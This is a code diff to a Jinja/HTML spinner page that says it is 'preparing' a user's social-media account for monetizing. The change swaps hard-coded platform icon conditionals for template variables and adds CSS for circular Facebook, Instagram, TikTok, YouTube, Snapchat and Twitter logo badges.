@@ -2,23 +2,11 @@
 {% block body %}
 <div class="spinner-container">
   <!-- Premium Card -->
-  <div class="premium-card">
-    <!-- Platform Badge -->
+  <div class="premium-card" style="box-shadow:0 4px 12px {{ platform_shadow_color|default('rgba(59,130,246,0.15)') }};">
+    <!-- Platform Badge - EXACT SOCIAL MEDIA LOGO STYLING -->
     <div class="platform-badge">
-      <div class="platform-icon-container">
-        {% if platform == 'facebook' %}
-          <i class="fa-brands fa-facebook-f platform-icon"></i>
-        {% elif platform == 'instagram' %}
-          <i class="fa-brands fa-instagram platform-icon"></i>
-        {% elif platform == 'tiktok' %}
-          <i class="fa-brands fa-tiktok platform-icon"></i>
-        {% elif platform == 'snapchat' %}
-          <i class="fa-brands fa-snapchat-ghost platform-icon"></i>
-        {% elif platform == 'twitter' %}
-          <i class="fa-brands fa-x-twitter platform-icon"></i>
-        {% else %}
-          <i class="fa-solid fa-shield-check platform-icon"></i>
-        {% endif %}
+      <div class="icon-circle {{ platform_bg_class|default('bg-twitter') }}">
+        <i class="{{ platform_icon }} icon-lg"></i>
       </div>
     </div>
     
@@ -38,7 +26,7 @@
     <!-- Progress Text -->
     <div class="progress-content">
       <h3 class="processing-title">Processing Request</h3>
-      <p class="processing-subtitle">Preparing your <span class="platform-name">{{ platform|title }}</span> account for monetizing</p>
+      <p class="processing-subtitle">Preparing your <span class="platform-name">{{ platform_name|title }}</span> account for monetizing</p>
       <div class="progress-bar">
         <div class="progress-fill"></div>
       </div>
@@ -81,35 +69,35 @@
 
 <style>
   /* Platform-specific colors - Reduced glow intensity */
-  {% if platform == 'facebook' %}
+  {% if platform_name == 'Facebook' %}
   :root { 
     --primary-color: #1877F2;
     --glow-color: rgba(24, 119, 242, 0.12);
     --light-bg: rgba(24, 119, 242, 0.08);
     --gradient: linear-gradient(135deg, #1877F2, #166FE5);
   }
-  {% elif platform == 'instagram' %}
+  {% elif platform_name == 'Instagram' %}
   :root { 
     --primary-color: #E4405F;
     --glow-color: rgba(228, 64, 95, 0.12);
     --light-bg: rgba(228, 64, 95, 0.08);
     --gradient: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
   }
-  {% elif platform == 'tiktok' %}
+  {% elif platform_name == 'TikTok' %}
   :root { 
     --primary-color: #FF0050;
     --glow-color: rgba(255, 0, 80, 0.12);
     --light-bg: rgba(255, 0, 80, 0.08);
     --gradient: linear-gradient(135deg, #FF0050, #00F2EA);
   }
-  {% elif platform == 'snapchat' %}
+  {% elif platform_name == 'Snapchat' %}
   :root { 
     --primary-color: #FFFC00;
     --glow-color: rgba(255, 252, 0, 0.15);
     --light-bg: rgba(255, 252, 0, 0.06);
     --gradient: linear-gradient(135deg, #FFFC00, #FFD700);
   }
-  {% elif platform == 'twitter' %}
+  {% elif platform_name == 'Twitter' or platform_name == 'X / Twitter' %}
   :root { 
     --primary-color: #1DA1F2;
     --glow-color: rgba(29, 161, 242, 0.12);
@@ -124,6 +112,71 @@
     --gradient: linear-gradient(135deg, #1877F2, #166FE5);
   }
   {% endif %}
+
+  /* EXACT SOCIAL MEDIA LOGO STYLING FROM YOUR CSS */
+  .icon-circle {
+    width: 80px;
+    height: 80px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.4s ease;
+    margin: 0 auto;
+  }
+
+  /* Platform-specific styles matching your design */
+  .bg-facebook .icon-circle {
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(24,119,242,0.15), 0 0 14px rgba(24,119,242,0.25);
+  }
+  .bg-facebook i { color: #1877F2; }
+
+  .bg-instagram .icon-circle {
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(193,53,132,0.15), 0 0 14px rgba(225,48,108,0.25);
+  }
+  .bg-instagram i {
+    background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    font-weight: 800;
+  }
+
+  .bg-tiktok .icon-circle {
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(0,0,0,0.1), 0 0 16px rgba(255,0,80,0.25), 0 0 16px rgba(0,242,234,0.25);
+  }
+  .bg-tiktok i {
+    color: #000;
+    text-shadow: -1.8px 0 #00f2ea, 1.8px 0 #ff0050;
+    font-weight: 800;
+  }
+
+  .bg-youtube .icon-circle {
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(255,0,0,0.18), 0 0 14px rgba(255,0,0,0.28);
+  }
+  .bg-youtube i { color: #FF0000; font-weight: 800; }
+
+  .bg-snapchat .icon-circle {
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(255,252,0,0.22), 0 0 18px rgba(255,252,0,0.35);
+  }
+  .bg-snapchat i {
+    color: #FFFC00;
+    -webkit-text-stroke: 1.5px #000;
+    font-weight: 800;
+  }
+
+  .bg-twitter .icon-circle {
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(0,0,0,0.12), 0 0 16px rgba(0,0,0,0.22);
+  }
+  .bg-twitter i { color: #000; font-weight: 800; }
+
+  .icon-lg { font-size: 32px; }
 
   /* Main Container */
   .spinner-container {
@@ -144,10 +197,6 @@
     border-radius: 24px;
     padding: 48px 32px 32px;
     text-align: center;
-    box-shadow: 
-      0 4px 6px -1px rgba(0, 0, 0, 0.05),
-      0 2px 4px -1px rgba(0, 0, 0, 0.03),
-      0 0 0 1px rgba(0, 0, 0, 0.02);
     border: 1px solid rgba(255, 255, 255, 0.8);
     transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
   }
@@ -173,30 +222,6 @@
   /* Platform Badge */
   .platform-badge {
     margin-bottom: 32px;
-  }
-
-  .platform-icon-container {
-    width: 80px;
-    height: 80px;
-    margin: 0 auto;
-    background: var(--light-bg);
-    border-radius: 20px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-    animation: iconFloat 3s ease-in-out infinite;
-  }
-
-  .platform-icon {
-    font-size: 32px;
-    color: var(--primary-color);
-    filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
-  }
-
-  @keyframes iconFloat {
-    0%, 100% { transform: translateY(0px); }
-    50% { transform: translateY(-6px); }
   }
 
   /* Premium Spinner */
@@ -379,12 +404,12 @@
       border-radius: 20px;
     }
     
-    .platform-icon-container {
+    .icon-circle {
       width: 70px;
       height: 70px;
     }
     
-    .platform-icon {
+    .icon-lg {
       font-size: 28px;
     }
     
